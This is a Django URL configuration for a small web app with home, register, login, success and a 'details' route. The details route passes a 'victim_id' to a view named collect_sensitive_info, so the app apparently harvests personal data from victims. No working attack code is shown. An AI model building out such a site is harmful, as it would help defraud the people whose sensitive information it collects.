from django.urls import path
from . import views

urlpatterns = [
    path('', views.home, name='home'),  # Home page should be mapped here
    path('register/', views.register, name='register'),
    path('login/', views.login, name='login'),
    path('details/<int:victim_id>/', views.collect_sensitive_info, name='details'),
    path('success/', views.success, name='success'),
]
